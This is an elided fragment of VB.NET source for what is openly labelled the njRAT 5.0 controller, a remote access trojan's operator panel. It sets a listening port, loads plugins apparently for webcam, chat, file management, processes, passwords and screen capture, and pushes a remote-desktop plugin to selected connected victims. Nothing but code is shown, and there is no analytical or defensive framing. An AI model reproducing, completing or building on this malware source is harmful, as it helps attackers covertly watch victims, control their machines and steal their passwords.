...
Public Class Form1
    ...
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        Next
        Dim str2 As String
        For Each str2 In Strings.Split("cam.dll,ch.dll,fm.dll,proc.dll,pw.dll,sc2.dll", ",", -1, CompareMethod.Binary)
...
Label_00C9:
        Try
            Dim str3 As String = Interaction.InputBox("..", "PORT", FN.GTV("port", "1166"), -1, -1)
            If (str3.Length = 0) Then
                End
            End If

            Me.Text = "NjRat 5.0 Porta : " & str3
    ...
    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("sc2.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
